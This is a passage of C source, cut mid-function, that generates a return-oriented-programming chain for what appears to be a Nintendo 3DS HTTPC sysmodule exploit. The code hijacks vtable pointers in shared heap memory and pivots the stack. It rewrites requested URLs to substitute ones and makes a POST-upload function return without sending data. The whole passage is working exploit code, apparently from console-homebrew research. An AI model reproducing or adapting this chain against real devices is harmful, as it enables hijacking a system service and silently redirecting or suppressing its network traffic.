			targeturl_list[i].vtableptr = targeturl_list[pos].vtableptr;//Don't copy vtable_sharedmemptr since that would result in initializing the vtable memory multiple times below.
		}
	}

	//Setup the ROP-chain used by the vtable funcptrs from the end of this function.

	ropgen_strr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);//Due to the "mov r0, r4" done previously, r0 contains the cmdbuf ptr at this point. Save that ptr @ ropheap+0x0.
	ropgen_copyu32(&ropchain, &ropvaddr, __httpmainthread_cmdhandler_stackframe + 24 + 12, ropheap+0x4, 0x3);//Copy the _this value for httpc_cmdhandler, from the saved r7 in the httpc_cmdhandler stackframe to ropheap+0x4.

	//Copy the backup ROP-chain to the main offset then pivot to the main ROP-chain.
	ropgen_memcpy(&ropchain, &ropvaddr, ropvmem_base+ropoffset, ropvmem_base+bakropoff, ropallocsize);
	ropgen_stackpivot(&ropchain, &ropvaddr, ropvmem_base+ropoffset);

	if(ropvaddr-ropvmem_base > ropoffset)
	{
		printf("The initial ROP-chain in ropvmem is 0x%08x-bytes too large.\n", (unsigned int)(ropvaddr-ropvmem_base - ropoffset));
		return -2;
	}

	//Create a backup of the above ROP.
	roplaunch_bakaddr = ropvaddr;
	roplaunch_baksize = ropvaddr - ropvmem_base;
	memcpy((u32*)&ropvmem_sharedmem[(roplaunch_bakaddr-ropvmem_base)>>2], (u32*)ropvmem_sharedmem, roplaunch_baksize);

	if(roplaunch_bakaddr+roplaunch_baksize - ropvmem_base > ropoffset)
	{
		printf("The initial backup ROP-chain in ropvmem is 0x%08x-bytes too large.\n", (unsigned int)(roplaunch_bakaddr+roplaunch_baksize - ropvmem_base - ropoffset));
		return -2;
	}

	ropchain = (u32*)&ropvmem_sharedmem[bakropoff>>2];
	ropvaddr = ropvmem_base+ropoffset;

	ropgen_memcpy(&ropchain, &ropvaddr, ropvmem_base, roplaunch_bakaddr, roplaunch_baksize);//Restore the initial CreateContext ROP using the backup.

	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);
	ropgen_movr1r0(&ropchain, &ropvaddr);
	ropgen_ldrr0r1(&ropchain, &ropvaddr, 0, 0);//r0 = cmdbuf[0](cmdhdr).
	ropgen_strr0r1(&ropchain, &ropvaddr, ropheap+0x14, 1);//Write the u32 cmdhdr to ropheap+0x14.

	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x14, 1);
	ropgen_popr1(&ropchain, &ropvaddr, 0x00020082);//CreateContext cmdhdr.
	ropchain0 = ropchain;
	ropvaddr0 = ropvaddr;
	ropgen_checkcond(&ropchain, &ropvaddr, 0x0, 0, 1);//Pivot to <addr which gets filled in below> when cmdhdr==CreateContext.

	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x14, 1);
	ropgen_popr1(&ropchain, &ropvaddr, 0x001100C4);//AddRequestHeader cmdhdr.
	ropchain1 = ropchain;
	ropvaddr1 = ropvaddr;
	ropgen_checkcond(&ropchain, &ropvaddr, 0x0, 0, 1);//Pivot to <addr which gets filled in below> when cmdhdr==AddRequestHeader.

	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x14, 1);
	ropgen_popr1(&ropchain, &ropvaddr, 0x001200C4);//AddPostDataAscii cmdhdr.
	ropchain2 = ropchain;
	ropvaddr2 = ropvaddr;
	ropgen_checkcond(&ropchain, &ropvaddr, 0x0, 0, 1);//Pivot to <addr which gets filled in below> when cmdhdr==AddPostDataAscii.

	ropgen_addword(&ropchain, &ropvaddr, 0x44444444);//Command-header is invalid, trigger a crash(this should never happen).

	//Setup the actual cmdhdr pivot for CreateContext, the actual ROP-chain for CreateContext follows this.

	ropgen_checkcond(&ropchain0, &ropvaddr0, ropvaddr, 0, 1);

	ropgen_writeu32(&ropchain, &ropvaddr, ROP_CreateContext, __custom_mainservsession_vtable + 0x8, 1);//Restore the vtable funcptr back to the original sysmodule one.

	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);//r0 = cmdbuf ptr.
	ropgen_add_r0ip(&ropchain, &ropvaddr, 0x10);//r0+= 0x10.
	ropgen_movr1r0(&ropchain, &ropvaddr);
	ropgen_ldrr0r1(&ropchain, &ropvaddr, 0, 0);//r0 = cmdbuf[4], URL ptr.
	ropgen_strr0r1(&ropchain, &ropvaddr, ropheap+0x18, 1);//Write the URL ptr to ropheap+0x18.
	ropgen_strr0r1(&ropchain, &ropvaddr, ropvaddr + 0x20 + 0x3c + 0x10 + 0x4, 1);//Overwrite the r1 value which will be used for the below strncpy with the above URL ptr.

	ropgen_strncpy(&ropchain, &ropvaddr, ropheap+0x100, 0, 0xff);//strncpy(ropheap+0x100, createcontext_inputurl, 0xff);

	ropgen_writeu32(&ropchain, &ropvaddr, 0x0, ropheap+0x1c, 1);//*((u32*)(ropheap+0x1c)) = 0;
	ropgen_writeu32(&ropchain, &ropvaddr, 0x0, ropheap+0x20, 1);//*((u32*)(ropheap+0x20)) = 0;

	for(pos=0; pos<targeturl_list_entcount; pos++)
	{
		tmpval = 0;
		if(targeturl_list[pos].new_url[0])tmpval+= 0x30;

		ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x1c, 1);
		ropgen_popr1(&ropchain, &ropvaddr, 0);
		ropgen_checkcond(&ropchain, &ropvaddr, 0, ropvaddr + 0x40 + 0x74 + 0x8 + 0x40 + 0x30 + tmpval, 0);//if(<vtableptr value was set in a previous loop iteration>)<pivot to the end of this iteration block>

		tmp_pos = targeturl_list_vaddr + pos*sizeof(targeturlctx);

		memset(params, 0, sizeof(params));
		params[0] = ropheap+0x100;
		params[1] = tmp_pos + offsetof(targeturlctx, url);
		params[2] = strnlen(targeturl_list[pos].url, 0xff);

		ropgen_callfunc(&ropchain, &ropvaddr, ROP_strncmp, params);
		/*
		if(strncmp(createcontext_inputurl, targeturl_list[pos].url, 0xff)==0)
		{
			*((u32*)(ropheap+0x1c)) = targeturl_list[pos].vtableptr;
			*((u32*)(ropheap+0x20)) = targeturl_list[pos].new_url;//Not generated when new_url is empty.
		}
		*/

		ropgen_popr1(&ropchain, &ropvaddr, 0);
		ropgen_checkcond(&ropchain, &ropvaddr, 0, ropvaddr + 0x40 + 0x30 + tmpval, 0);

		ropgen_writeu32(&ropchain, &ropvaddr, targeturl_list[pos].vtableptr, ropheap+0x1c, 1);
		if(tmpval)ropgen_writeu32(&ropchain, &ropvaddr, tmp_pos + offsetof(targeturlctx, new_url), ropheap+0x20, 1);
	}

	//if(<new_url ptr initialized above is actually set>)<execute the following strncpy ROP>
	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x20, 1);
	ropgen_popr1(&ropchain, &ropvaddr, 0);
	ropgen_checkcond(&ropchain, &ropvaddr, ropvaddr + 0x48 + 0x20*4 + 0x74, 0, 1);

	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x18, 1);//r0 = URL bufptr originally from the cmdbuf.
	ropgen_strr0r1(&ropchain, &ropvaddr, ropvaddr + 0x20*3 + 0x3c + 0x4, 1);//Overwrite the r0 value which will be used for the below strncpy with the above URL ptr.

	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x20, 1);
	ropgen_strr0r1(&ropchain, &ropvaddr, ropvaddr + 0x20 + 0x3c + 0x10 + 0x4, 1);//Overwrite the r1 value which will be used for the below strncpy with the above new_url ptr.

	ropgen_strncpy(&ropchain, &ropvaddr, 0, 0, 0xff);//strncpy(createcontext_inputurl, targeturl_list[targetindex].new_url, 0xff);

	ropgen_copyu32(&ropchain, &ropvaddr, ropheap+0x0, ropvaddr + 0x20 + 0x40 + 0x4, 0x3);//Overwrite the r4 value which gets popped below, with the saved cmdbuf ptr from above.
	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x4, 1);//Restore r0 to the _this value copied above.
	ropgen_setr4(&ropchain, &ropvaddr, 0);

	ropgen_addword(&ropchain, &ropvaddr, ROP_HTTPC_CMDHANDLER_CREATECONTEXT);
	created_contexthandle_stackaddr = ropvaddr+4;
	ropgen_addwords(&ropchain, &ropvaddr, 0, 6 + 7);//"add sp, sp, #24" "pop {r4..sl, pc}"

	ropgen_writeu32(&ropchain, &ropvaddr, ROP_ADDSPx154_MOVR0R4_POPR4R5R6R7R8R9SLFPPC, __custom_mainservsession_vtable + 0x8, 1);//Restore the vtable funcptr back to the original modified one.

	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x4, 1);//r0 = _this
	ropgen_add_r0ip(&ropchain, &ropvaddr, 0x10);//r0+= 0x10.
	ropgen_movr1r0(&ropchain, &ropvaddr);
	ropgen_ldrr0r1(&ropchain, &ropvaddr, 0, 0);//r0 = *(_this+16);
	ropgen_strr0r1(&ropchain, &ropvaddr, ropheap+0x8, 1);//Write *(_this+16) to ropheap+0x8.

	ropgen_copyu32(&ropchain, &ropvaddr, created_contexthandle_stackaddr, ropheap+0xc, 0x3);//Copy the contexthandle to ropheap+0xc.

	ropgen_copyu32(&ropchain, &ropvaddr, ropheap+0x8, ropvaddr + 0x40 + 0x40 + 0x40, 0x3);//Copy the above objptr to the value which will be used for r0 in the below func-call.

	ropgen_copyu32(&ropchain, &ropvaddr, ropheap+0xc, ropvaddr + 0x40 + 0x50, 0x3);//Copy the contexthandle to the value which which will be used for r1 in the below func-call.

	memset(params, 0, sizeof(params));
	ropgen_callfunc(&ropchain, &ropvaddr, ROP_http_context_getctxptr, params);

	ropgen_strr0r1(&ropchain, &ropvaddr, ropheap+0x10, 1);//Write the contextptr to ropheap+0x10. This is the same object from httpc_cmdhandler *(_this+16) for context-sessions.

	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x1c, 1);//When the vtableptr at ropheap+0x1c is set to zero(URL doesn't match any targets), jump over the below ROP which writes the vtableptr into the object.
	ropgen_popr1(&ropchain, &ropvaddr, 0);
	ropgen_checkcond(&ropchain, &ropvaddr, ropvaddr + 0x48 + 0x40 + 0x20 + 0x40 + 0x2c + 0x28, 0, 1);

	ropgen_copyu32(&ropchain, &ropvaddr, ropheap+0x1c, ropvaddr + 0x40 + 0x20 + 0x40 + 0x2c + 0x4, 0x3);//Copy the vtableptr from ropheap+0x1c which was previously initialized above, to the value which will be used for the below writeu32.

	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x10, 1);

	ropgen_add_r0ip(&ropchain, &ropvaddr, 0xfffffffc);
	ropgen_movr1r0(&ropchain, &ropvaddr);
	ropgen_writeu32(&ropchain, &ropvaddr, 0, 0, 0);//Overwrite the vtable for the above object.

	ropgen_writeu32(&ropchain, &ropvaddr, ROP_HTTPC_CMDHANDLER_RETURN, __httpmainthread_cmdhandler_stackframe-4, 1);

	ropgen_stackpivot(&ropchain, &ropvaddr, __httpmainthread_cmdhandler_stackframe-4);

	//Setup the actual cmdhdr pivot for AddRequestHeader, the actual ROP-chain for AddRequestHeader follows this.

	ropgen_checkcond(&ropchain1, &ropvaddr1, ropvaddr, 0, 1);

	ropgen_addword(&ropchain, &ropvaddr, 0xf0f0f0f0);

	//Setup the actual cmdhdr pivot for AddPostDataAscii, the actual ROP-chain for AddPostDataAscii follows this.

	ropgen_checkcond(&ropchain2, &ropvaddr2, ropvaddr, 0, 1);

	ropgen_addword(&ropchain, &ropvaddr, 0xe0e0e0e0);

	if(ropvaddr-ropvmem_base > bakropoff)
	{
		printf("The main ROP-chain in ropvmem is 0x%08x-bytes too large.\n", (unsigned int)(ropvaddr-ropvmem_base - bakropoff));
		return -2;
	}

	ropvaddr = ropvaddr - ropoffset + bakropoff;
	if(ropvaddr > mainrop_endaddr)
	{
		printf("The backup version of the main ROP-chain in ropvmem is 0x%08x-bytes too large.\n", (unsigned int)(ropvaddr - mainrop_endaddr));
		return -2;
	}

	//Setup the object used by ropgen_cond_callfunc().
	ptr = condcallfunc_objaddr_sharedmemptr;
	ptr[0] = condcallfunc_objaddr + 0x4 - 0xcc;//Setup the vtable ptr so that the funcptr is loaded from the below word.
	ptr[1] = ROP_POPPC;

	//Setup the custom vtable for main serv sessions.
	ptr = __custom_mainservsession_vtable_sharedmemptr;
	memcpy(ptr, &http_codebin_buf[ROP_HTTPC_MAINSERVSESSION_OBJPTR_VTABLE - 0x100000], ROP_HTTPC_CMDHANDLER_OBJPTR_VTABLE_SIZE);
	ptr[0x8>>2] = ROP_ADDSPx154_MOVR0R4_POPR4R5R6R7R8R9SLFPPC;//Overwrite the vtable funcptr for CreateContext.

	//Setup the custom vtables for context-sessions.
	for(pos=0; pos<targeturl_list_entcount; pos++)
	{
		ptr = targeturl_list[pos].vtable_sharedmemptr;
		if(ptr==NULL)continue;

		tmpcaps = targeturl_list[pos].caps;

		memcpy(ptr, &http_codebin_buf[ROP_HTTPC_CONTEXTSERVSESSION_OBJPTR_VTABLE - 0x100000], ROP_HTTPC_CMDHANDLER_OBJPTR_VTABLE_SIZE);
		//Overwrite the vtable funcptrs.
		//ptr[0x6c>>2] = 0x80808080;//ReceiveDataTimeout. This is called from the same seperate thread as CloseContext.
		if(tmpcaps & TARGETURLCAP_AddRequestHeader)ptr[0x80>>2] = ROP_ADDSPx154_MOVR0R4_POPR4R5R6R7R8R9SLFPPC;//AddRequestHeader. This is called from the main-thread.
		if(tmpcaps & TARGETURLCAP_AddPostDataAscii)ptr[0x84>>2] = ROP_ADDSPx154_MOVR0R4_POPR4R5R6R7R8R9SLFPPC;//AddPostDataAscii. This is called from the main-thread.
		if(tmpcaps & TARGETURLCAP_SendPOSTDataRawTimeout)ptr[0xa8>>2] = ROP_MOVR0_VAL0_BXLR;//SendPOSTDataRawTimeout. This is called from the same seperate thread as CloseContext. With this HTTPC:SendPOSTDataRawTimeout will just return 0 without doing anything, hence the specified POST data will not be uploaded.
	}

	memcpy(targeturl_list_sharedmemptr, targeturl_list, targeturl_list_size);

	//Overwrite every main-serv-sesssion httpc_cmdhandler object *(_this+16) vtable ptr with the custom one.

	for(pos=0; pos<(httpheap_size>>2); pos++)
	{
		if(httpheap_sharedmem[pos] != ROP_HTTPC_MAINSERVSESSION_OBJPTR_VTABLE)continue;

		httpheap_sharedmem[pos] = __custom_mainservsession_vtable;
	}

	return 0;
}

